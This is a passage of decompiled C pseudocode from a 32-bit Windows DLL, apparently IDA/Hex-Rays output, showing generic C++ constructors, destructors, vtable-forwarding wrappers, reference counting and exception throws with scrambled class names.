  v5 = lpAddend;
  v6 = a2;
  *a1 = &off_10093E80;
  a1[4] = v5;
  a1[3] = v6;
  InterlockedIncrement(v5);
  sub_1000CE26(a1 + 5, (int)&a4);
  LOBYTE(v11) = 4;
  if ( sub_1000D0B5((int)&unk_100BF7AC, (int)&a4) )
  {
    v7 = sub_1000D027(v9, (int)&a4, (int)&unk_100BF7A4);
    LOBYTE(v11) = 5;
    v10 = 1;
  }
  else
  {
    v7 = &unk_100BF7AC;
  }
  sub_1000CE26(a1 + 7, (int)v7);
  v11 = 7;
  if ( (v10 & 1) != 0 )
  {
    v10 &= ~1u;
    sub_1000CE59(v9);
  }
  LOBYTE(v11) = 0;
  sub_10003C0C(&a2);
  v11 = -1;
  sub_1000CE59(&a4);
  return a1;
}
// 10093E80: using guessed type int (__thiscall *off_10093E80)(void *Block, char);

//----- (1001831D) --------------------------------------------------------
int *__thiscall sub_1001831D(int *Block, char a2)
{
  sub_10018372(Block);
  if ( (a2 & 1) != 0 )
    j__free(Block);
  return Block;
}

//----- (1001833D) --------------------------------------------------------
int __stdcall sub_1001833D(int a1)
{
  int result; // eax

  result = a1;
  *(_DWORD *)a1 = &off_10093D34;
  *(_DWORD *)(a1 + 4) = 0;
  *(_BYTE *)(a1 + 8) = 0;
  *(_BYTE *)(a1 + 9) = 0;
  *(_DWORD *)a1 = &off_10093E18;
  return result;
}
// 10093D34: using guessed type int (__thiscall *off_10093D34)(void *Block, char);
// 10093E18: using guessed type int (__thiscall *off_10093E18)(void *Block, char);

//----- (10018372) --------------------------------------------------------
void __stdcall sub_10018372(int *a1)
{
  sub_1000CE59(a1 + 7);
  sub_1000CE59(a1 + 5);
  sub_10003C0C(a1 + 3);
  sub_1002A751(a1);
}

//----- (100183BB) --------------------------------------------------------
_DWORD *__thiscall sub_100183BB(_DWORD *Block, char a2)
{
  sub_1002A751(Block);
  if ( (a2 & 1) != 0 )
    j__free(Block);
  return Block;
}

//----- (100183DA) --------------------------------------------------------
_DWORD *__fastcall sub_100183DA(int a1, int a2, _DWORD *a3)
{
  _DWORD *v3; // eax
  int v5[2]; // [esp+10h] [ebp-18h] BYREF
  int v6; // [esp+18h] [ebp-10h]
  int v7; // [esp+24h] [ebp-4h]

  v6 = 0;
  if ( *(_DWORD *)(*(_DWORD *)(a1 + 4) + 28) )
  {
    v3 = sub_1000D027(v5, a2 + 28, a1);
    v7 = 1;
    v6 = 1;
  }
  else
  {
    v3 = (_DWORD *)(a2 + 20);
  }
  sub_1000CE26(a3, (int)v3);
  v6 |= 2u;
  v7 = 0;
  if ( (v6 & 1) != 0 )
  {
    v6 &= ~1u;
    sub_1000CE59(v5);
  }
  return a3;
}

//----- (10018440) --------------------------------------------------------
LONG __thiscall sub_10018440(_DWORD *this, int a2, int a3)
{
  int v3; // esi
  _DWORD *v4; // eax
  int v6[4]; // [esp+10h] [ebp-14h] BYREF
  int v7; // [esp+20h] [ebp-4h]

  v3 = this[3];
  v4 = sub_100183DA(a2, (int)this, v6);
  v7 = 0;
  (*(void (__thiscall **)(int, _DWORD *, int))(*(_DWORD *)v3 + 20))(v3, v4, a3);
  v7 = -1;
  return sub_1000CE59(v6);
}
// 10018440: using guessed type int var_14[4];

//----- (10018480) --------------------------------------------------------
LONG __thiscall sub_10018480(_DWORD *this, int a2, int a3)
{
  int v3; // esi
  _DWORD *v4; // eax
  int v6[4]; // [esp+10h] [ebp-14h] BYREF
  int v7; // [esp+20h] [ebp-4h]

  v3 = this[3];
  v4 = sub_100183DA(a2, (int)this, v6);
  v7 = 0;
  (*(void (__thiscall **)(int, _DWORD *, int))(*(_DWORD *)v3 + 24))(v3, v4, a3);
  v7 = -1;
  return sub_1000CE59(v6);
}
// 10018480: using guessed type int var_14[4];

//----- (100184C0) --------------------------------------------------------
LONG __thiscall sub_100184C0(_DWORD *this, int a2, int a3)
{
  int v3; // esi
  _DWORD *v4; // eax
  int v6[4]; // [esp+10h] [ebp-14h] BYREF
  int v7; // [esp+20h] [ebp-4h]

  v3 = this[3];
  v4 = sub_100183DA(a2, (int)this, v6);
  v7 = 0;
  (*(void (__thiscall **)(int, _DWORD *, int))(*(_DWORD *)v3 + 28))(v3, v4, a3);
  v7 = -1;
  return sub_1000CE59(v6);
}
// 100184C0: using guessed type int var_14[4];

//----- (10018500) --------------------------------------------------------
LONG __thiscall sub_10018500(_DWORD *this, int a2, int a3)
{
  int v3; // esi
  _DWORD *v4; // eax
  int v6[4]; // [esp+10h] [ebp-14h] BYREF
  int v7; // [esp+20h] [ebp-4h]

  v3 = this[3];
  v4 = sub_100183DA(a2, (int)this, v6);
  v7 = 0;
  (*(void (__thiscall **)(int, _DWORD *, int))(*(_DWORD *)v3 + 32))(v3, v4, a3);
  v7 = -1;
  return sub_1000CE59(v6);
}
// 10018500: using guessed type int var_14[4];

//----- (10018540) --------------------------------------------------------
LONG __thiscall sub_10018540(_DWORD *this, int a2, int a3, int a4)
{
  int *v5; // esi
  _DWORD *v6; // eax
  int v7; // edx
  _DWORD v9[6]; // [esp+0h] [ebp-30h] BYREF
  int v10[5]; // [esp+18h] [ebp-18h] BYREF
  int v11; // [esp+2Ch] [ebp-4h]

  v11 = 0;
  v5 = (int *)this[3];
  v10[2] = (int)v9;
  sub_1000CE26(v9, (int)&a3);
  LOBYTE(v11) = 1;
  v6 = sub_100183DA(a2, (int)this, v10);
  LOBYTE(v11) = 2;
  v7 = *v5;
  LOBYTE(v11) = 3;
  (*(void (__thiscall **)(int *, _DWORD *))(v7 + 36))(v5, v6);
  LOBYTE(v11) = 0;
  sub_1000CE59(v10);
  v11 = -1;
  return sub_1000CE59(&a3);
}

//----- (100185A8) --------------------------------------------------------
LONG __thiscall sub_100185A8(_DWORD *this, int a2, double a3)
{
  int v3; // esi
  _DWORD *v4; // eax
  int v6[4]; // [esp+18h] [ebp-14h] BYREF
  int v7; // [esp+28h] [ebp-4h]

  v3 = this[3];
  v4 = sub_100183DA(a2, (int)this, v6);
  v7 = 0;
  (*(void (__thiscall **)(int, _DWORD *, _DWORD, _DWORD))(*(_DWORD *)v3 + 40))(v3, v4, LODWORD(a3), HIDWORD(a3));
  v7 = -1;
  return sub_1000CE59(v6);
}
// 100185A8: using guessed type int var_14[4];

//----- (100185ED) --------------------------------------------------------
LONG __thiscall sub_100185ED(_DWORD *this, int a2, int a3, int a4, int a5, int a6, int a7, _DWORD *a8)
{
  int *v9; // esi
  _DWORD *v10; // eax
  int v11; // edx
  _DWORD v13[5]; // [esp-18h] [ebp-3Ch] BYREF
  _DWORD *v14; // [esp-4h] [ebp-28h]
  int v15[4]; // [esp+10h] [ebp-14h] BYREF
  int v16; // [esp+20h] [ebp-4h]

  v16 = 0;
  v14 = a8;
  v9 = (int *)this[3];
  a8 = v13;
  sub_10016AE9(&a3, (int)v13);
  LOBYTE(v16) = 1;
  v10 = sub_100183DA(a2, (int)this, v15);
  LOBYTE(v16) = 2;
  v11 = *v9;
  LOBYTE(v16) = 3;
  (*(void (__thiscall **)(int *, _DWORD *, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD *))(v11 + 44))(
    v9,
    v10,
    v13[0],
    v13[1],
    v13[2],
    v13[3],
    v13[4],
    v14);
  LOBYTE(v16) = 0;
  sub_1000CE59(v15);
  v16 = -1;
  return sub_10016B53(&a3);
}
// 100185ED: using guessed type int var_14[4];

//----- (10018657) --------------------------------------------------------
LONG __thiscall sub_10018657(_DWORD *this, int a2, int a3, int a4, int a5, int a6, int a7)
{
  int *v8; // esi
  _DWORD *v9; // eax
  int v10; // edx
  _BYTE v12[36]; // [esp+0h] [ebp-3Ch] BYREF
  int v13[5]; // [esp+24h] [ebp-18h] BYREF
  int v14; // [esp+38h] [ebp-4h]

  v14 = 0;
  v8 = (int *)this[3];
  v13[2] = (int)v12;
  sub_10016AE9(&a3, (int)v12);
  LOBYTE(v14) = 1;
  v9 = sub_100183DA(a2, (int)this, v13);
  LOBYTE(v14) = 2;
  v10 = *v8;
  LOBYTE(v14) = 3;
  (*(void (__thiscall **)(int *, _DWORD *))(v10 + 48))(v8, v9);
  LOBYTE(v14) = 0;
  sub_1000CE59(v13);
  v14 = -1;
  return sub_10016B53(&a3);
}

//----- (100186BE) --------------------------------------------------------
char __thiscall sub_100186BE(_DWORD *this, int a2)
{
  int v2; // esi
  _DWORD *v3; // eax
  char v4; // bl
  int v6[4]; // [esp+10h] [ebp-14h] BYREF
  int v7; // [esp+20h] [ebp-4h]

  v2 = this[3];
  v3 = sub_100183DA(a2, (int)this, v6);
  v7 = 0;
  v4 = (*(int (__thiscall **)(int, _DWORD *))(*(_DWORD *)v2 + 52))(v2, v3);
  v7 = -1;
  sub_1000CE59(v6);
  return v4;
}
// 100186BE: using guessed type int var_14[4];

//----- (100186FF) --------------------------------------------------------
char __thiscall sub_100186FF(_DWORD *this, int a2)
{
  int v2; // esi
  _DWORD *v3; // eax
  char v4; // bl
  int v6[4]; // [esp+10h] [ebp-14h] BYREF
  int v7; // [esp+20h] [ebp-4h]

  v2 = this[3];
  v3 = sub_100183DA(a2, (int)this, v6);
  v7 = 0;
  v4 = (*(int (__thiscall **)(int, _DWORD *))(*(_DWORD *)v2 + 56))(v2, v3);
  v7 = -1;
  sub_1000CE59(v6);
  return v4;
}
// 100186FF: using guessed type int var_14[4];

//----- (10018740) --------------------------------------------------------
__int16 __thiscall sub_10018740(_DWORD *this, int a2)
{
  int v2; // esi
  _DWORD *v3; // eax
  int v5[4]; // [esp+10h] [ebp-14h] BYREF
  int v6; // [esp+20h] [ebp-4h]

  v2 = this[3];
  v3 = sub_100183DA(a2, (int)this, v5);
  v6 = 0;
  LOWORD(v2) = (*(int (__thiscall **)(int, _DWORD *))(*(_DWORD *)v2 + 60))(v2, v3);
  v6 = -1;
  sub_1000CE59(v5);
  return v2;
}
// 10018740: using guessed type int var_14[4];

//----- (10018783) --------------------------------------------------------
int __thiscall sub_10018783(_DWORD *this, int a2)
{
  int v2; // esi
  _DWORD *v3; // eax
  int v4; // esi
  int v6[4]; // [esp+10h] [ebp-14h] BYREF
  int v7; // [esp+20h] [ebp-4h]

  v2 = this[3];
  v3 = sub_100183DA(a2, (int)this, v6);
  v7 = 0;
  v4 = (*(int (__thiscall **)(int, _DWORD *))(*(_DWORD *)v2 + 64))(v2, v3);
  v7 = -1;
  sub_1000CE59(v6);
  return v4;
}
// 10018783: using guessed type int var_14[4];

//----- (100187C4) --------------------------------------------------------
int __thiscall sub_100187C4(_DWORD *this, int a2, int a3, int a4)
{
  int v4; // esi
  _DWORD *v5; // eax
  int v7[2]; // [esp+10h] [ebp-18h] BYREF
  int v8; // [esp+18h] [ebp-10h]
  int v9; // [esp+24h] [ebp-4h]

  v8 = 0;
  v4 = this[3];
  v5 = sub_100183DA(a3, (int)this, v7);
  v9 = 1;
  (*(void (__thiscall **)(int, int, _DWORD *, int))(*(_DWORD *)v4 + 68))(v4, a2, v5, a4);
  v8 = 1;
  LOBYTE(v9) = 0;
  sub_1000CE59(v7);
  return a2;
}

//----- (10018813) --------------------------------------------------------
int __thiscall sub_10018813(_DWORD *this, int a2, int a3)
{
  int v3; // esi
  _DWORD *v4; // eax
  int v6[2]; // [esp+10h] [ebp-18h] BYREF
  int v7; // [esp+18h] [ebp-10h]
  int v8; // [esp+24h] [ebp-4h]

  v7 = 0;
  v3 = this[3];
  v4 = sub_100183DA(a3, (int)this, v6);
  v8 = 1;
  (*(void (__thiscall **)(int, int, _DWORD *))(*(_DWORD *)v3 + 72))(v3, a2, v4);
  v7 = 1;
  LOBYTE(v8) = 0;
  sub_1000CE59(v6);
  return a2;
}

//----- (1001885F) --------------------------------------------------------
int __thiscall sub_1001885F(_DWORD *this, int a2, int a3)
{
  int v3; // esi
  _DWORD *v4; // eax
  int v6[2]; // [esp+10h] [ebp-18h] BYREF
  int v7; // [esp+18h] [ebp-10h]
  int v8; // [esp+24h] [ebp-4h]

  v7 = 0;
  v3 = this[3];
  v4 = sub_100183DA(a3, (int)this, v6);
  v8 = 1;
  (*(void (__thiscall **)(int, int, _DWORD *))(*(_DWORD *)v3 + 76))(v3, a2, v4);
  v7 = 1;
  LOBYTE(v8) = 0;
  sub_1000CE59(v6);
  return a2;
}

//----- (100188AB) --------------------------------------------------------
LONG __thiscall sub_100188AB(_DWORD *this, int a2)
{
  int v2; // esi
  _DWORD *v3; // eax
  int v5[4]; // [esp+18h] [ebp-14h] BYREF
  int v6; // [esp+28h] [ebp-4h]

  v2 = this[3];
  v3 = sub_100183DA(a2, (int)this, v5);
  v6 = 0;
  (*(void (__thiscall **)(int, _DWORD *))(*(_DWORD *)v2 + 80))(v2, v3);
  v6 = -1;
  return sub_1000CE59(v5);
}
// 100188AB: using guessed type int var_14[4];

//----- (100188EE) --------------------------------------------------------
int __thiscall sub_100188EE(_DWORD *this, int a2)
{
  int v2; // esi
  _DWORD *v3; // eax
  int v4; // esi
  int v6[4]; // [esp+10h] [ebp-14h] BYREF
  int v7; // [esp+20h] [ebp-4h]

  v2 = this[3];
  v3 = sub_100183DA(a2, (int)this, v6);
  v7 = 0;
  v4 = (*(int (__thiscall **)(int, _DWORD *))(*(_DWORD *)v2 + 84))(v2, v3);
  v7 = -1;
  sub_1000CE59(v6);
  return v4;
}
// 100188EE: using guessed type int var_14[4];

//----- (1001892F) --------------------------------------------------------
char __thiscall sub_1001892F(_DWORD *this, int a2)
{
  int v2; // esi
  _DWORD *v3; // eax
  char v4; // bl
  int v6[4]; // [esp+10h] [ebp-14h] BYREF
  int v7; // [esp+20h] [ebp-4h]

  v2 = this[3];
  v3 = sub_100183DA(a2, (int)this, v6);
  v7 = 0;
  v4 = (*(int (__thiscall **)(int, _DWORD *))(*(_DWORD *)v2 + 88))(v2, v3);
  v7 = -1;
  sub_1000CE59(v6);
  return v4;
}
// 1001892F: using guessed type int var_14[4];

//----- (10018970) --------------------------------------------------------
LONG __thiscall sub_10018970(_DWORD *this, int a2)
{
  int v2; // esi
  _DWORD *v3; // eax
  int v5[4]; // [esp+10h] [ebp-14h] BYREF
  int v6; // [esp+20h] [ebp-4h]

  v2 = this[3];
  v3 = sub_100183DA(a2, (int)this, v5);
  v6 = 0;
  (*(void (__thiscall **)(int, _DWORD *))(*(_DWORD *)v2 + 92))(v2, v3);
  v6 = -1;
  return sub_1000CE59(v5);
}
// 10018970: using guessed type int var_14[4];

//----- (100189AD) --------------------------------------------------------
_DWORD *__thiscall sub_100189AD(_DWORD *this, _DWORD *a2, int a3)
{
  int v4; // ebx
  _DWORD *v5; // eax
  unsigned int i; // ebx
  int v7; // eax
  _DWORD *v8; // edi
  int v9; // ecx
  int v11[2]; // [esp+10h] [ebp-20h] BYREF
  int v12[2]; // [esp+18h] [ebp-18h] BYREF
  int v13; // [esp+20h] [ebp-10h]
  int v14; // [esp+2Ch] [ebp-4h]
  unsigned int v15; // [esp+3Ch] [ebp+Ch]

  v14 = 0;
  v13 = 0;
  v4 = this[3];
  v5 = sub_100183DA(a3, (int)this, v12);
  v14 = 1;
  (*(void (__thiscall **)(int, _DWORD *, _DWORD *))(*(_DWORD *)v4 + 96))(v4, a2, v5);
  v13 = 1;
  LOBYTE(v14) = 0;
  sub_1000CE59(v12);
  v15 = 0;
  for ( i = *(_DWORD *)(this[8] + 28); v15 < a2[1]; ++v15 )
  {
    v7 = (*(int (__thiscall **)(_DWORD *, unsigned int))(*a2 + 44))(a2, v15);
    sub_10012A7C(v12, v7);
    v14 = 2;
    v8 = sub_1000D2DE((int)v12, i, v11, 0xFFFFFFFE);
    LOBYTE(v14) = 3;
    v9 = (*(int (__thiscall **)(_DWORD *, unsigned int))(*a2 + 44))(a2, v15);
    sub_10002C25(v8 + 1, (int *)(v9 + 4));
    LOBYTE(v14) = 2;
    sub_1000CE59(v11);
    LOBYTE(v14) = 0;
    sub_10012AAC(v12);
  }
  return a2;
}

//----- (10018A7D) --------------------------------------------------------
int __thiscall sub_10018A7D(int **this)
{
  return sub_10017087(this[3]);
}

//----- (10018A88) --------------------------------------------------------
int __thiscall sub_10018A88(int *this)
{
  return sub_10017063(this[3]);
}

//----- (10018A96) --------------------------------------------------------
_DWORD *__userpurge sub_10018A96@<eax>(int a1@<ebx>, _DWORD *a2)
{
  int v2; // eax
  int v3; // ecx
  _DWORD *v5; // [esp-8h] [ebp-34h] BYREF
  int v6; // [esp-4h] [ebp-30h]
  int v7[6]; // [esp+10h] [ebp-1Ch] BYREF
  int v8; // [esp+28h] [ebp-4h]

  sub_1001833D((int)a2);
  v8 = 0;
  v6 = a1;
  v5 = a2 + 3;
  *a2 = &off_10093EF8;
  sub_1002DD20((int)v5, v6);
  sub_10019CB7(a2 + 14, 0);
  LOBYTE(v8) = 2;
  a2[16] = 0;
  a2[17] = 0;
  v2 = (*(int (__thiscall **)(int, int *))(*(_DWORD *)a1 + 36))(a1, v7);
  LOBYTE(v8) = 3;
  v6 = v3;
  v5 = (_DWORD *)v3;
  v7[2] = (int)&v5;
  sub_1000D027(&v5, v2, (int)&unk_100BF6F8);
  LOBYTE(v8) = 3;
  sub_1002E885(a2 + 18, (struct _SECURITY_ATTRIBUTES *)1, (int)v5, v6);
  LOBYTE(v8) = 6;
  sub_1000CE59(v7);
  return a2;
}
// 10018AE8: variable 'v3' is possibly undefined
// 10093EF8: using guessed type int (__thiscall *off_10093EF8)(void *Block, char);

//----- (10018B2B) --------------------------------------------------------
void *__thiscall sub_10018B2B(void *Block, char a2)
{
  sub_10018B4B((int)Block);
  if ( (a2 & 1) != 0 )
    j__free(Block);
  return Block;
}

//----- (10018B4B) --------------------------------------------------------
void __stdcall sub_10018B4B(int a1)
{
  sub_1002E8FA((_DWORD *)(a1 + 72));
  sub_10019CF6((void **)(a1 + 56));
  sub_1002DDDC((int *)(a1 + 12));
  sub_1002A751((_DWORD *)a1);
}

//----- (10018B95) --------------------------------------------------------
int __stdcall sub_10018B95(int a1, unsigned int a2, unsigned int a3)
{
  _DWORD *v3; // eax
  _DWORD v5[2]; // [esp+10h] [ebp-1Ch] BYREF
  void *v6[4]; // [esp+18h] [ebp-14h] BYREF
  int v7; // [esp+28h] [ebp-4h]

  sub_100171BE((int *)(a1 + 12), v5);
  v7 = 0;
  ++*(_DWORD *)(a1 + 68);
  sub_1002DED2(a2, a1 + 12, a3);
  v3 = sub_1002B023(v6, (int *)(a1 + 12));
  LOBYTE(v7) = 1;
  sub_10019D24(v3, a1 + 56);
  LOBYTE(v7) = 0;
  sub_10019CF6(v6);
  **(_DWORD **)(a1 + 92) = *(_DWORD *)(a1 + 68);
  v7 = -1;
  return sub_100171F2(v5);
}
// 10018B95: using guessed type _DWORD var_1C[2];

//----- (10018C09) --------------------------------------------------------
int __thiscall sub_10018C09(_DWORD **this)
{
  return (*(int (__thiscall **)(_DWORD *))(*this[6] + 24))(this[6]);
}

//----- (10018C11) --------------------------------------------------------
int __thiscall sub_10018C11(void *this, int a2)
{
  sub_1002E7A0((int)this + 12, a2);
  return a2;
}

//----- (10018C43) --------------------------------------------------------
void __stdcall sub_10018C43(_DWORD *a1, int a2, int a3)
{
  _DWORD pExceptionObject[5]; // [esp+10h] [ebp-14h] BYREF

  pExceptionObject[4] = 0;
  if ( *a1 != a3 )
  {
    sub_10018C8B(pExceptionObject, 1);
    _CxxThrowException(pExceptionObject, (_ThrowInfo *)&_TI3_AVLfeuifzffjRpmufflxh_ezrqwlx_sr__);
  }
  sub_10019BCB((void **)&a1);
}

//----- (10018C8B) --------------------------------------------------------
_DWORD *__stdcall sub_10018C8B(_DWORD *a1, int a2)
{
  if ( a2 )
  {
    *a1 = &unk_10093EEC;
    sub_10016441(a1 + 1);
  }
  *(_DWORD *)((char *)a1 + *(_DWORD *)(*a1 + 4)) = &off_10093974;
  *(_DWORD *)((char *)a1 + *(_DWORD *)(*a1 + 4)) = &off_10093EE4;
  return a1;
}
// 10093974: using guessed type int (__stdcall *off_10093974)(char);
// 10093EE4: using guessed type int (__stdcall *off_10093EE4)(char);

//----- (10018CE5) --------------------------------------------------------
void __thiscall sub_10018CE5(_DWORD *this)
{
  _DWORD *v1; // esi

  v1 = this + 1;
  sub_10018D93((int)(this + 1));
  sub_1001646C(v1);
}

//----- (10018CF7) --------------------------------------------------------
_DWORD *__thiscall sub_10018CF7(_DWORD *this, int a2, int a3)
{
  int v4; // eax

  if ( a3 )
  {
    *this = &unk_10093EEC;
    if ( a2 )
      v4 = a2 + *(_DWORD *)(*(_DWORD *)a2 + 4);
    else
      v4 = 0;
    sub_10016406(this + 1, v4);
  }
  sub_10010A9E(this, a2, 0);
  *(_DWORD *)((char *)this + *(_DWORD *)(*this + 4)) = &off_10093EE4;
  return this;
}
// 10093EE4: using guessed type int (__stdcall *off_10093EE4)(char);

//----- (10018D66) --------------------------------------------------------
_DWORD *__thiscall sub_10018D66(_DWORD *this, char a2)
{
  _DWORD *v2; // esi

  v2 = this - 1;
  sub_10018D93((int)this);
  sub_1001646C(this);
  if ( (a2 & 1) != 0 )
    j__free(v2);
  return v2;
}

//----- (10018D93) --------------------------------------------------------
int __stdcall sub_10018D93(int a1)
{
  int result; // eax

  result = a1;
  *(_DWORD *)(*(_DWORD *)(*(_DWORD *)(a1 - 4) + 4) + a1 - 4) = &off_10093974;
  return result;
}
// 10093974: using guessed type int (__stdcall *off_10093974)(char);

//----- (10018DBC) --------------------------------------------------------
void __stdcall sub_10018DBC(int a1, int a2)
{
  _DWORD pExceptionObject[4]; // [esp+10h] [ebp-10h] BYREF

  pExceptionObject[3] = 0;
  if ( !a1 )
  {
    sub_1001668F(pExceptionObject);
    _CxxThrowException(pExceptionObject, (_ThrowInfo *)&_TI2_AVTyxCkOnhqdgZuatyxcko_sr__);
  }
  sub_10019BCB((void **)&a1);
}

//----- (10018DFE) --------------------------------------------------------
void __stdcall sub_10018DFE(int a1, volatile LONG *lpAddend, volatile LONG *a3)
{
  volatile LONG *v3; // esi
  _DWORD *v4; // ebx
  _DWORD *v5; // [esp-4h] [ebp-2Ch] BYREF
  volatile LONG *v6; // [esp+0h] [ebp-28h] BYREF
  volatile LONG *v7; // [esp+4h] [ebp-24h]
  int *v8; // [esp+18h] [ebp-10h]
  int v9; // [esp+24h] [ebp-4h]

  v9 = 0;
  v3 = lpAddend;
  v4 = (_DWORD *)a1;
  v8 = (int *)&v6;
  v7 = lpAddend;
  v6 = (volatile LONG *)a1;
  InterlockedIncrement(lpAddend);
  LOBYTE(v9) = 0;
  sub_10018DBC((int)v6, (int)v7);
  v7 = a3;
  a3 = (volatile LONG *)&v5;
  v6 = v3;
  v5 = v4;
  InterlockedIncrement(v3);
  LOBYTE(v9) = 0;
  sub_10018C43(v5, (int)v6, (int)v7);
  v9 = -1;
  sub_10019BCB((void **)&a1);
}

//----- (10018E6A) --------------------------------------------------------
LONG __thiscall sub_10018E6A(int *this, int a2, int a3)
{
  int v4; // eax
  _DWORD v6[5]; // [esp-18h] [ebp-4Ch] BYREF
  int v7; // [esp-4h] [ebp-38h]
  int v8[8]; // [esp+10h] [ebp-24h] BYREF
  int v9; // [esp+30h] [ebp-4h]

  HIBYTE(a3) = (_BYTE)a3 != 0;
  sub_10016983((void *)1, (int)v8, (char *)&a3 + 3);
  v9 = 0;
  v7 = 10;
  v8[5] = (int)v6;
  sub_10016AE9(v8, (int)v6);
  LOBYTE(v9) = 1;
  v4 = *this;
  LOBYTE(v9) = 0;
  (*(void (__thiscall **)(int *, int, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD, int))(v4 + 44))(
    this,
    a2,
    v6[0],
    v6[1],
    v6[2],
    v6[3],
    v6[4],
    v7);
  v9 = -1;
  return sub_10016B53(v8);
}

//----- (10018ECE) --------------------------------------------------------
LONG __thiscall sub_10018ECE(int *this, int a2, int a3)
{
  int v4; // eax
  _DWORD v6[5]; // [esp-18h] [ebp-4Ch] BYREF
  int v7; // [esp-4h] [ebp-38h]
  int v8[8]; // [esp+10h] [ebp-24h] BYREF
  int v9; // [esp+30h] [ebp-4h]

  sub_10016983((void *)1, (int)v8, &a3);
  v9 = 0;
  v7 = 7;
  v8[5] = (int)v6;
  sub_10016AE9(v8, (int)v6);
  LOBYTE(v9) = 1;
  v4 = *this;
  LOBYTE(v9) = 0;
  (*(void (__thiscall **)(int *, int, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD, int))(v4 + 44))(
    this,
    a2,
    v6[0],
    v6[1],
    v6[2],
    v6[3],
    v6[4],
    v7);
  v9 = -1;
  return sub_10016B53(v8);
}

//----- (10018F28) --------------------------------------------------------
LONG __thiscall sub_10018F28(int *this, int a2, int a3)
{
  int v4; // eax
  _DWORD v6[5]; // [esp-18h] [ebp-4Ch] BYREF
  int v7; // [esp-4h] [ebp-38h]
  int v8[8]; // [esp+10h] [ebp-24h] BYREF
  int v9; // [esp+30h] [ebp-4h]

  sub_10016983((void *)2, (int)v8, &a3);
  v9 = 0;
  v7 = 8;
  v8[5] = (int)v6;
  sub_10016AE9(v8, (int)v6);
  LOBYTE(v9) = 1;
  v4 = *this;
  LOBYTE(v9) = 0;
  (*(void (__thiscall **)(int *, int, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD, int))(v4 + 44))(
    this,
    a2,
    v6[0],
    v6[1],
    v6[2],
    v6[3],
    v6[4],
    v7);
  v9 = -1;
  return sub_10016B53(v8);
}

//----- (10018F82) --------------------------------------------------------
LONG __thiscall sub_10018F82(int *this, int a2, int a3)
{
  int v4; // eax
  _DWORD v6[5]; // [esp-18h] [ebp-4Ch] BYREF
  int v7; // [esp-4h] [ebp-38h]
  int v8[8]; // [esp+10h] [ebp-24h] BYREF
  int v9; // [esp+30h] [ebp-4h]

  sub_10016983((void *)4, (int)v8, &a3);
  v9 = 0;
  v7 = 6;
  v8[5] = (int)v6;
  sub_10016AE9(v8, (int)v6);
  LOBYTE(v9) = 1;
  v4 = *this;
  LOBYTE(v9) = 0;
  (*(void (__thiscall **)(int *, int, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD, int))(v4 + 44))(
    this,
    a2,
    v6[0],
    v6[1],
    v6[2],
    v6[3],
    v6[4],
    v7);
  v9 = -1;
  return sub_10016B53(v8);
}

//----- (10018FDC) --------------------------------------------------------
LONG __thiscall sub_10018FDC(int *this, int a2, int a3, int a4)
{
  int v5; // eax
  _DWORD v7[5]; // [esp-18h] [ebp-38h] BYREF
  int v8; // [esp-4h] [ebp-24h]
  _DWORD *v9; // [esp+10h] [ebp-10h]
  int v10; // [esp+1Ch] [ebp-4h]

  v10 = 0;
  v8 = 5;
  v9 = v7;
  sub_1000C7A8((int)&a3, v7);
  LOBYTE(v10) = 1;
  v5 = *this;
  LOBYTE(v10) = 0;
  (*(void (__thiscall **)(int *, int, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD, int))(v5 + 44))(
    this,
    a2,
    v7[0],
    v7[1],
    v7[2],
    v7[3],
    v7[4],
    v8);
  v10 = -1;
  return sub_1000CE59(&a3);
}

//----- (10019026) --------------------------------------------------------
LONG __thiscall sub_10019026(int *this, int a2, int a3, int a4)
{
  int v5; // eax
  _DWORD v7[5]; // [esp-18h] [ebp-4Ch] BYREF
  int v8; // [esp-4h] [ebp-38h]
  int v9[8]; // [esp+10h] [ebp-24h] BYREF
  int v10; // [esp+30h] [ebp-4h]

  sub_10016983((void *)8, (int)v9, &a3);
  v10 = 0;
  v8 = 9;
  v9[5] = (int)v7;
  sub_10016AE9(v9, (int)v7);
  LOBYTE(v10) = 1;
  v5 = *this;
  LOBYTE(v10) = 0;
  (*(void (__thiscall **)(int *, int, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD, int))(v5 + 44))(
    this,
    a2,
    v7[0],
    v7[1],
    v7[2],
    v7[3],
    v7[4],
    v8);
  v10 = -1;
  return sub_10016B53(v9);
}

//----- (10019080) --------------------------------------------------------
LONG __thiscall sub_10019080(int *this, int a2, int a3, int a4, int a5, int a6, int a7)
{
  int v8; // eax
  _DWORD v10[5]; // [esp-18h] [ebp-38h] BYREF
  int v11; // [esp-4h] [ebp-24h]
  _DWORD *v12; // [esp+10h] [ebp-10h]
  int v13; // [esp+1Ch] [ebp-4h]

  v13 = 0;
  v11 = 4;
  v12 = v10;
  sub_10016AE9(&a3, (int)v10);
  LOBYTE(v13) = 1;
  v8 = *this;
  LOBYTE(v13) = 0;
  (*(void (__thiscall **)(int *, int, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD, int))(v8 + 44))(
    this,
    a2,
    v10[0],
    v10[1],
    v10[2],
    v10[3],
    v10[4],
    v11);
  v13 = -1;
  return sub_10016B53(&a3);
}

//----- (100190CA) --------------------------------------------------------
LONG __thiscall sub_100190CA(int *this, int a2, int a3, int a4, int a5, void *a6, int a7, _DWORD **a8)
{
  _DWORD *v10; // [esp-Ch] [ebp-38h] BYREF
  volatile LONG *v11; // [esp-8h] [ebp-34h]
  int *v12; // [esp-4h] [ebp-30h]
  _DWORD v13[2]; // [esp+10h] [ebp-1Ch] BYREF
  _DWORD *v14; // [esp+18h] [ebp-14h] BYREF
  volatile LONG *v15; // [esp+1Ch] [ebp-10h]
  int v16; // [esp+28h] [ebp-4h]

  v16 = 0;
  sub_100171BE(this, v13);
  LOBYTE(v16) = 1;
  sub_1001966A(this, &v14, a2, (int)a8, a6);
  LOBYTE(v16) = 2;
  v12 = &a3;
  v11 = v15;
  a8 = &v10;
  v10 = v14;
  InterlockedIncrement(v15);
  LOBYTE(v16) = 2;
  sub_100197D4(this, a2, v10, v11, v12);
  LOBYTE(v16) = 1;
  sub_10019BCB((void **)&v14);
  LOBYTE(v16) = 0;
  sub_100171F2(v13);
  v16 = -1;
  return sub_10016B53(&a3);
}
// 100190CA: using guessed type _DWORD var_1C[2];

//----- (1001915D) --------------------------------------------------------
